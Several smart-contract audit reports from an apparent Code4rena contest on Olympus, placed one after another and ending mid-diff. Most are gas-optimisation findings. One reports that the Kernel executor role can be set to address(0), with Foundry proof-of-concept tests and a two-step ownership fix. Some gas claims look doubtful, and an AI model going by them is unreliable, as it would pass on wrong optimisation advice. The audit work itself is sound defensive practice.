public constant FACTOR_SCALE = 1e4;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L65  ```solidity File: src/policies/Governance.sol  121:      uint256 public constant SUBMISSION_REQUIREMENT = 100;  124:      uint256 public constant ACTIVATION_DEADLINE = 2 weeks;  127:      uint256 public constant GRACE_PERIOD = 1 weeks;  130:      uint256 public constant ENDORSEMENT_THRESHOLD = 20;  133:      uint256 public constant EXECUTION_THRESHOLD = 33;  137:      uint256 public constant EXECUTION_TIMELOCK = 3 days;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L121  ```solidity File: src/policies/Operator.sol  83:       uint8 public immutable ohmDecimals;  86:       uint8 public immutable reserveDecimals;  89:       uint32 public constant FACTOR_SCALE = 1e4;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L83  ### [G&#x2011;19]  Don't compare boolean  ... See the rest this report [here](https://github.com/code-423n4/2022-08-olympus-findings/blob/main/data/IllIllI-G.md)
# Lines of code  https://github.com/fullyallocated/Default/blob/master/src/Kernel.sol#L192   # Vulnerability details  ### Impact  The `executor` and `admin` roles are important administrative roles that can be set to any arbitrary address that the organisation does not control e.g. `address(0).`   This impact is that the system can no longer be  administered as the `executor` role is the key administrator role for adding, upgrading and removing Kernels, Modules, Policies, Executors and Admins.  Both the `admin` and `executor` roles can be set to an arbitrary address in a single step however it is worse if the `executor` is changed to something like  `address(0)` as no other role can change it back. The `executor` can change the `admin` role but the `admin` cannot change the executor.  Due to the impact I believe this to be of Medium to High severity.  ### Proof of Concept  Below is a test demonstrating that the `executor` role can be set to `address(0)` by the current `executor`;  ```solidity function testCorrectness_ChangeExecutorToAddressZero() public {   // Demonstrate how the executor role can be changed by setting   // it to the multisig address.   vm.startPrank(deployer);   kernel.executeAction(Actions.ChangeExecutor, address(multisig));   vm.stopPrank();   assertEq(kernel.executor(), address(multisig));    // As the current executor set the new executor to be address(0).   vm.prank(multisig);   kernel.executeAction(Actions.ChangeExecutor, address(0));   vm.stopPrank();   assertEq(kernel.executor(), address(0)); } ```  The `admin` role cannot modify the `executor` so if it is set to a arbitrary address that Olympus does not control it cannot be reset;  ```solidity function testCorrectness_AdminCannotChangeExecutor() public {   // Demonstrate how the admin role can be changed by setting   // it to the multisig address.   vm.startPrank(deployer);   kernel.executeAction(Actions.ChangeAdmin, address(multisig));   vm.stopPrank();   assertEq(kernel.admin(), address(multisig));    // As the current admin try and change the executor.   vm.prank(multisig);   err = abi.encodeWithSignature("Kernel_OnlyExecutor(address)", multisig);   vm.expectRevert(err);   kernel.executeAction(Actions.ChangeExecutor, address(0));   vm.stopPrank(); } ```  ### Tools Used  Vim  ### Recommended Remediation Steps  The Kernel should implement a two step ownership change for crucial roles such as the `executor` and `admin`. In the first step the ownership change is ‘proposed’ and the address of the new owner (for `executor` or `admin`) is stored in a state variable. As part of the proposal `address(0)` can be checked and a revert take place. In the second step the new owner would then need to ‘accept’ the ownership change by executing a function on the smart contract.   Furthermore I feel that the `executor` should not not be able to change the `admin` role via `Actions.ChangeAdmin` on [L212](https://github.com/fullyallocated/Default/blob/master/src/Kernel.sol#L212) and the `admin` should be able to set a new `executor`. This would ensure there is proper separation of duties between the `admin` and the `executor` roles.
1. Use `external` modifier instead of `public` to save deployment gas. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L37 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L33 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L37 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L75 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L145 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L151 2. Check revert things on top of the function. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L48 
## USE CALLDATA INSTEAD OF MEMORY  When a function with a memory array is called externally, the abi.decode() step has to use a for-loop to copy each index of the calldata to the memoryindex. Each iteration of this for-loop costs at least 60 gas (i.e. 60 * <mem_array>.length). Using calldata directly, obliviates the need for such a loop in the contract code and runtime execution. Structs have the same overhead as an array of length one  When arguments are read-only on external functions, the data location should be calldata  7 instances:  -Kernel.sol line 393 -PRICE.sol line 205 -BondCallback.sol line 152 -Governance.sol line 162 -Operator lines 96, 97 -TreasuryCustodian..sol line 53  ## <ARRAY>.LENGTH SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A FOR-LOOP  Reading array length at each iteration of the loop consumes more gas than necessary. In the best case scenario (length read on a memory variable), caching the array length in the stack saves around 3 gas per iteration. In the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.  Consider storing the array’s length in a variable before the for-loop, and use this new variable instead  1 instance: Governance.sol lines 278  ## ++i COSTS LESS GAS THAN i++, ESPECIALLY WHEN IT’S USED IN FOR-LOOPS (--I/I-- TOO)  This saves 6 gas per instace  2 instances: KernelUtils.sol lines 49, 64  ## IT COSTS MORE GAS TO INITIALIZE VARIABLES WITH THEIR DEFAULT VALUE THAN LETTING THE DEFAULT VALUE BE APPLIED  If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example:  ` for (uint256 i = 0; i < numIterations; ++i) {  ` should be replaced with:  ` for (uint256 i; i < numIterations; ++i) { `  3 instances: Kernel.sol line 397 KernelUtils.sol lines 43, 58   ## USING > 0 COSTS MORE GAS THAN != 0 WHEN USED ON A UINT  This saves 6 gas per instance.  1 instance: Governance.sol line 247  ## USING >= 10  COSTS MORE GAS THAN > 9  1 instance Operator.sol line 486  ## SHORTCIRCUITING OPTIMIZATION  __Kernel.sol line 283:__  The order of the functions inside the if statement in line 283:  ` if (address(oldModule) == address(0) || oldModule == newModule_) `  can be switched to: ` if (oldModule == newModule_ || address(oldModule) == address(0)) ` for optimal gas usage because oldModule == newModule_ is more probable to be TRUE hence second one won’t be executed and hence save you gas.  **Operator.sol line 739:**  Checking sideActive in the second part of the if clause is not necessary because if that second part is executed sideActive can only be true: `  if (             !sideActive ||             (sideActive &&                 auctioneer.isLive(market) &&                 RANGE.capacity(high_) < auctioneer.currentCapacity(market))         ) ` can be switched to: `  if (             !sideActive ||             ( auctioneer.isLive(market) &&                 RANGE.capacity(high_) < auctioneer.currentCapacity(market))         ) `  for optimal gas usage because sideActive is already TRUE hence no need to check it and hence save you gas.   ## USING PRIVATE RATHER THAN PUBLIC FOR CONSTANTS, SAVES GAS  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  7 instances: -Governance.sol 121, 124, 127, 130, 133, 137  -Operator.sol 89    
### [G-01] ++i costs less gas compared to i++  ++i costs **about 5 gas less per iteration** compared to i++ for unsigned integer.  Same thing for decremental with -- operator. This statement is true even with the optimizer enabled. Summarized my results where i is used in a loop, is unsigned integer, and you safely can be changed to ++i without changing any behavior,  ** Most places are using best practice (++i and unchecked where possible) - good job Yet I've found 5 locations that can do better:  ``` src/policies/Operator.sol:   487              price_ = price_ / 10;   488:             decimals++;   489          }    669                  _status.low.observations[regen.nextObservation] = true;   670:                 _status.low.count++;   671              }    674                  _status.low.observations[regen.nextObservation] = false;   675:                 _status.low.count--;   676              }    685                  _status.high.observations[regen.nextObservation] = true;   686:                 _status.high.count++;   687              }      690                  _status.high.observations[regen.nextObservation] = false;   691:                 _status.high.count--;   692              }    ```  ---------------------------------------------------------------------------   ### [G-02] An arrays length should be cached to save gas in for-loops  An array’s length should be cached to save gas in for-loops Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset). Caching the array length in the stack saves around **3 gas per iteration**.  I've found only 1 location to improve:  ``` src/policies/Governance.sol:   277     278:         for (uint256 step; step < instructions.length; ) {   279              kernel.executeAction(instructions[step].action, instructions[step].target);    ```  ---------------------------------------------------------------------------   ### [G-03] Using default values is cheaper than assignment  If a variable is not set/initialized, it is assumed to have the default value 0 for uint, and false for boolean. Explicitly initializing it with its default value is an anti-pattern and wastes gas. For example: ```uint8 i = 0;``` should be replaced with ```uint8 i;```  I've found 3 locations in 2 files:  ``` src/Kernel.sol:   396          uint256 reqLength = requests_.length;   397:         for (uint256 i = 0; i < reqLength; ) {   398              Permissions memory request = requests_[i];  src/utils/KernelUtils.sol:   42     43:     for (uint256 i = 0; i < 5; ) {   44          bytes1 char = unwrapped[i];    57     58:     for (uint256 i = 0; i < 32; ) {   59          bytes1 char = unwrapped[i];   ```  ---------------------------------------------------------------------------   ### [G-04] != 0 is cheaper than > 0  != 0 costs less gas compared to > 0 for unsigned integers even when optimizer enabled All of the following findings are uint (E&OE) so >0 and != have exactly the same effect. ** saves 6 gas ** each  I've found only 1 place to improve - good job on all other uses of !=  ``` src/policies/Governance.sol:   246     247:         if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {   248              revert UserAlreadyVoted(); ```  ---------------------------------------------------------------------------   ### [G-05] Upgrade pragma to 0.8.16 to save gas  Across the whole solution, the declared pragma is 0.8.15 (good!) Upgrading to 0.8.16 may result in lower gas uses.  Source: ``` According to the release note of 0.8.16: https://blog.soliditylang.org/2022/08/08/solidity-0.8.16-release-announcement/ ".. there are several minor bug fixes and improvements like more gas-efficient overflow checks for addition and subtraction." ```   ---------------------------------------------------------------------------   * Custom errors save gas - already using custom errors all over the project - good job!! * Using immutables (for vars that are only in constructor) seems find throughout the project 
- [Gas](#gas)     - [**1. Don't use the length of an array for loops condition**](#1-dont-use-the-length-of-an-array-for-loops-condition)     - [**2. Reduce boolean comparison**](#2-reduce-boolean-comparison)         - [Total gas saved: **18 * 2 = 36**](#total-gas-saved-18--2--36)     - [**3. Avoid compound assignment operator in state variables**](#3-avoid-compound-assignment-operator-in-state-variables)         - [Total gas saved: **13 * 18 = 234**](#total-gas-saved-13--18--234)     - [**4. Shift right instead of dividing by 2**](#4-shift-right-instead-of-dividing-by-2)         - [Total gas saved: **172 * 2 = 344**](#total-gas-saved-172--2--344)     - [**5. ++i costs less gas compared to i++ or i += 1**](#5-i-costs-less-gas-compared-to-i-or-i--1)     - [**6. There's no need to set default values for variables**](#6-theres-no-need-to-set-default-values-for-variables)         - [Total gas saved: **8 * 2 = 16**](#total-gas-saved-8--2--16)     - [**7. Change bool to uint256 can save gas**](#7-change-bool-to-uint256-can-save-gas)     - [**8. Optimize KEYCODE**](#8-optimize-keycode)         - [Optimize MINTR.KEYCODE](#optimize-mintrkeycode)         - [Optimize INSTR.KEYCODE](#optimize-instrkeycode)         - [Optimize VOTES.KEYCODE](#optimize-voteskeycode)         - [Optimize PRICE.KEYCODE](#optimize-pricekeycode)         - [Optimize TRSRY.KEYCODE](#optimize-trsrykeycode)         - [Optimize RANGE.KEYCODE](#optimize-rangekeycode)     - [**9. Optimize  requestPermissions**](#9-optimize--requestpermissions)         - [Optimize  OlympusPriceConfig.requestPermissions](#optimize--olympuspriceconfigrequestpermissions)         - [Optimize VoterRegistration.requestPermissions](#optimize-voterregistrationrequestpermissions)     - [**10. Optimize configureDependencies using immutable**](#10-optimize-configuredependencies-using-immutable)         - [Optimize OlympusPriceConfig.configureDependencies](#optimize-olympuspriceconfigconfiguredependencies)         - [Optimize TreasuryCustodian.configureDependencies](#optimize-treasurycustodianconfiguredependencies)         - [Optimize BondCallback.configureDependencies](#optimize-bondcallbackconfiguredependencies)         - [Optimize Governance.configureDependencies](#optimize-governanceconfiguredependencies)         - [Optimize Operator.configureDependencies](#optimize-operatorconfiguredependencies)     - [**11. Avoid storage use**](#11-avoid-storage-use)     - [**12. Use inline instead of a method**](#12-use-inline-instead-of-a-method)     - [**13. Gas saving using immutable**](#13-gas-saving-using-immutable)     - [**14. Avoid public constants**](#14-avoid-public-constants)     - [**15. Reduce math operations**](#15-reduce-math-operations)         - [Optimize Governance.submitProposal](#optimize-governancesubmitproposal)         - [Optimize Governance.activateProposal](#optimize-governanceactivateproposal)         - [Optimize Governance.executeProposal](#optimize-governanceexecuteproposal)         - [Optimize Operator._activate](#optimize-operator_activate)     - [**16. Use calldata instead of memory**](#16-use-calldata-instead-of-memory)     - [**17. Optimze instructions order**](#17-optimze-instructions-order)         - [Optimize Governance.endorseProposal](#optimize-governanceendorseproposal)         - [Optimize Governance.endorseProposal](#optimize-governanceendorseproposal)     - [**18. Optimze Governance storage**](#18-optimze-governance-storage)     - [**19. delete optimization**](#19-delete-optimization)         - [Total gas saved: **5 * 1 = 5**](#total-gas-saved-5--1--5)     - [**20. Optimize Operator.bondPurchase**](#20-optimize-operatorbondpurchase)     - [**21. Optimize Operator refactoring some methods**](#21-optimize-operator-refactoring-some-methods)     - [**22. Optimize Operator.setRegenParams and Operator._regenerate**](#22-optimize-operatorsetregenparams-and-operator_regenerate)  # Gas  ## **1. Don't use the length of an array for loops condition**  It's cheaper to store the length of the array inside a local variable and iterate over it.  **Affected source code:**  - [Governance.sol:278](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L278)  ## **2. Reduce boolean comparison**  It's compared a boolean value using `== true` or `== false`, instead of using the boolean value. `NOT` opcode, it's cheaper to use `EQUAL` or `NOTEQUAL` when the value it's false, or just the value without `== true` when it's true, because it will use less opcodes inside the VM.  **Proof of concept (*without optimizations*):**  ```javascript pragma solidity 0.8.16;  contract TesterA { function testEqual(bool a) public view returns (bool) { return a == true; } }  contract TesterB { function testNot(bool a) public view returns (bool) { return a; } } ```  Gas saving executing: **18 per entry for == true**  ``` TesterA.testEqual:   21814 TesterB.testNot:     21796    ```  ```javascript pragma solidity 0.8.16;  contract TesterA { function testEqual(bool a) public view returns (bool) { return a == false; } }  contract TesterB { function testNot(bool a) public view returns (bool) { return !a; } } ```  Gas saving executing: **15 per entry for == false**  ``` TesterA.testEqual:   21814  TesterB.testNot:     21799 ```  **Affected source code:**  Use the value instead of `== true`:  - [Governance.sol:223](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L223) - [Governance.sol:306](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L306)  ### Total gas saved: **18 * 2 = 36**  ## **3. Avoid compound assignment operator in state variables**  Using compound assignment operator for state variables (like `State += X` or `State -= X` ...) it's more expensive than use operator assignment (like `State = State + X` or `State = State - X` ...).  **Proof of concept (*without optimizations*):**  ```javascript pragma solidity 0.8.15;  contract TesterA { uint private _a; function testShort() public {  _a += 1; } }  contract TesterB { uint private _a; function testLong() public {  _a = _a + 1; } } ```  Gas saving executing: **13 per entry**  ``` TesterA.testShort: 43507 TesterB.testLong:  43494 ```  **Affected source code:**  - [PRICE.sol:136](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L136) - [PRICE.sol:138](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L138) - [PRICE.sol:222](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L222) - [TRSRY.sol:96](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L96) - [TRSRY.sol:97](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L97) - [TRSRY.sol:115](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L115) - [TRSRY.sol:116](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L116) - [TRSRY.sol:131](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L131) - [TRSRY.sol:132](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L132) - [VOTES.sol:56](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L56) - [VOTES.sol:58](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L58) - [BondCallback.sol:143](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L143) - [BondCallback.sol:144](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L144) - [Governance.sol:194](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L194) - [Governance.sol:198](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L198) - [Governance.sol:252](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L252) - [Governance.sol:254](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L254) - [Heart.sol:103](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L103)  ### Total gas saved: **13 * 18 = 234**  ## **4. Shift right instead of dividing by 2**  Shifting one to the right will calculate a division by two.  he `SHR` opcode only requires 3 gas, compared to the `DIV` opcode's consumption of 5. Additionally, shifting is used to get around Solidity's division operation's division-by-0 prohibition.  **Proof of concept (*without optimizations*):**  ```javascript pragma solidity 0.8.15;  contract TesterA {  function testDiv(uint a) public returns (uint) { return a / 2; } }  contract TesterB {  function testShift(uint a) public returns (uint) { return a >> 1; } } ```  Gas saving executing: **172 per entry**  ``` TesterA.testDiv:    21965 TesterB.testShift:  21793    ```  **Affected source code:**  - [Operator.sol:372](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L372) - [Operator.sol:427](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L427)  ### Total gas saved: **172 * 2 = 344**  ## **5. `++i` costs less gas compared to `i++` or `i += 1`**  `++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments `i` and returns the initial value of `i`. Which means:  ```solidity uint i = 1; i++; // == 1 but i == 2 ```  But `++i` returns the actual incremented value:  ```solidity uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2` I suggest using `++i` instead of `i++` to increment the value of an uint variable. Same thing for `--i` and `i--`  *Keep in mind that this change can only be made when we are not interested in the value returned by the operation, since the result is different, you only have to apply it when you only want to increase a counter.*  **Affected source code:**  - [Operator.sol:488](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L488) - [Operator.sol:670](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L670) - [Operator.sol:675](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L675) - [Operator.sol:686](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L686) - [Operator.sol:691](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L691) - [KernelUtils.sol:49](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49) - [KernelUtils.sol:64](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L64)  ## **6. There's no need to set default values for variables**  If a variable is not set/initialized, the default value is assumed (0, `false`, 0x0 ... depending on the data type). You are simply wasting gas if you directly initialize it with its default value.  **Proof of concept (*without optimizations*):**  ```javascript pragma solidity 0.8.15;  contract TesterA { function testInit() public view returns (uint) { uint a = 0; return a; } }  contract TesterB { function testNoInit() public view returns (uint) { uint a; return a; } } ```  Gas saving executing: **8 per entry**  ``` TesterA.testInit:   21392 TesterB.testNoInit: 21384    ```  **Affected source code:**  - [KernelUtils.sol:43](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L43) - [KernelUtils.sol:58](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L58)  ### Total gas saved: **8 * 2 = 16**      ## **7. Change `bool` to `uint256` can save gas**  Because each write operation requires an additional `SLOAD` to read the slot's contents, replace the bits occupied by the boolean, and then write back, `booleans` are more expensive than `uint256` or any other type that uses a complete word. This cannot be turned off because it is the compiler's defense against pointer aliasing and contract upgrades.  Reference:  - https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol#L23-L27  Also, this is applicable to integer types different than `uint256` or `int56`.  **Affected source code for `booleans`:**  - [IOperator.sol:34](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/interfaces/IOperator.sol#L34) - [Heart.sol:33](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L33) - [Governance.sol:105](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L105) - [Governance.sol:117](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L117) - [Operator.sol:63](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L63) - [Operator.sol:66](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L66)  **Affected source code for `integers`:**  - [PRICE.sol:44](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L44) - [PRICE.sol:47](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L47) - [PRICE.sol:50](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L50) - [PRICE.sol:53](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L53) - [PRICE.sol:56](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L56) - [PRICE.sol:62](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L62)  ## **8. Optimize `KEYCODE`**  It is possible to optimize the `KEYCODE` method from the `Module` contract as shown below, or send the keycode to the base constructor to use the immutable in the base contract, as shown below.  ```javascript abstract contract Module is KernelAdapter {     KeyCode private immutable _KEYCODE;     constructor(Kernel kernel_, string memory keycode) KernelAdapter(kernel_) {          _KEYCODE = toKeycode("MINTR");     }     function KEYCODE() public pure virtual returns (Keycode) { return _KEYCODE; }     ... } contract OlympusTreasury is Module, ReentrancyGuard { ...     constructor(Kernel kernel_) Module(kernel_, "PRICE") {}     ... } ```  ### Optimize `MINTR.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode("MINTR");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode("MINTR");     } ```  **Affected source code:**  - [MINTR.sol:20-22](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/MINTR.sol#L20-L22)  ### Optimize `INSTR.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode("INSTR");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode("INSTR");     } ```  **Affected source code:**  - [INSTR.sol:24](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L24)  ### Optimize `VOTES.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode("VOTES");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode("VOTES");     } ```  **Affected source code:**  - [VOTES.sol:23](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L23)  ### Optimize `PRICE.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode("PRICE");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode("PRICE");     } ```  **Affected source code:**  - [PRICE.sol:109](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L109)  ### Optimize `TRSRY.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode("TRSRY");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode("TRSRY");     } ```  **Affected source code:**  - [TRSRY.sol:48](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L48)  ### Optimize `RANGE.KEYCODE`  **Recommended changes:**  ```diff +   KeyCode private immutable _KEYCODE = toKeycode("RANGE");     function KEYCODE() public pure override returns (Keycode) { +       return _KEYCODE; -       return toKeycode("RANGE");     } ```  **Affected source code:**  - [RANGE.sol:111](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L111)  ## **9. Optimize  `requestPermissions`** ### Optimize  `OlympusPriceConfig.requestPermissions`  **Recommended changes:**  ```diff     function requestPermissions()         external         view         override         returns (Permissions[] memory permissions)     {         permissions = new Permissions[](3); +       Keycode priceCode = PRICE.KEYCODE(); +       permissions[0] = Permissions(priceCode, PRICE.initialize.selector); +       permissions[1] = Permissions(priceCode, PRICE.changeMovingAverageDuration.selector); +       permissions[2] = Permissions(priceCode, PRICE.changeObservationFrequency.selector); -       permissions[0] = Permissions(PRICE.KEYCODE(), PRICE.initialize.selector); -       permissions[1] = Permissions(PRICE.KEYCODE(), PRICE.changeMovingAverageDuration.selector); -       permissions[2] = Permissions(PRICE.KEYCODE(), PRICE.changeObservationFrequency.selector);     } ```  **Affected source code:**  - [PriceConfig.sol:32-34](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/PriceConfig.sol#L32-L34)  ### Optimize `VoterRegistration.requestPermissions`  **Recommended changes:**  ```diff     function requestPermissions()         external         view         override         returns (Permissions[] memory permissions)     {         permissions = new Permissions[](2); +       Keycode votesCode = VOTES.KEYCODE(); +       permissions[0] = Permissions(votesCode, VOTES.mintTo.selector); +       permissions[1] = Permissions(votesCode, VOTES.burnFrom.selector); -       permissions[0] = Permissions(VOTES.KEYCODE(), VOTES.mintTo.selector); -       permissions[1] = Permissions(VOTES.KEYCODE(), VOTES.burnFrom.selector);     } ```  **Affected source code:**  - [VoterRegistration.sol:27-36](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/VoterRegistration.sol#L27-L36)  ## **10. Optimize `configureDependencies` using `immutable`**  ### Optimize `OlympusPriceConfig.configureDependencies`  **Recommended changes:**  ```diff +   KeyCode private immutable PRICE_CODE = toKeycode("PRICE");      function configureDependencies() external override returns (Keycode[] memory dependencies) {         dependencies = new Keycode[](1); -       dependencies[0] = toKeycode("PRICE"); +       dependencies[0] = PRICE_CODE;          PRICE = OlympusPrice(getModuleAddress(dependencies[0]));     } ```  **Affected source code:**  - [PriceConfig.sol:20](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/PriceConfig.sol#L20)  ### Optimize `TreasuryCustodian.configureDependencies`  **Recommended changes:**  ```diff +   KeyCode private immutable PRICE_CODE = toKeycode("TRSRY");      function configureDependencies() external override returns (Keycode[] memory dependencies) {         dependencies = new Keycode[](1); +       dependencies[0] = PRICE_CODE; -       dependencies[0] = toKeycode("TRSRY");          TRSRY = OlympusTreasury(getModuleAddress(dependencies[0]));     } ```  **Affected source code:**  - [TreasuryCustodian.sol:29](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L29)  ### Optimize `BondCallback.configureDependencies`  ```diff +   KeyCode private immutable dep0 = toKeycode("TRSRY"); +   KeyCode private immutable dep1 = toKeycode("MINTR");      function configureDependencies() external override returns (Keycode[] memory dependencies) {         dependencies = new 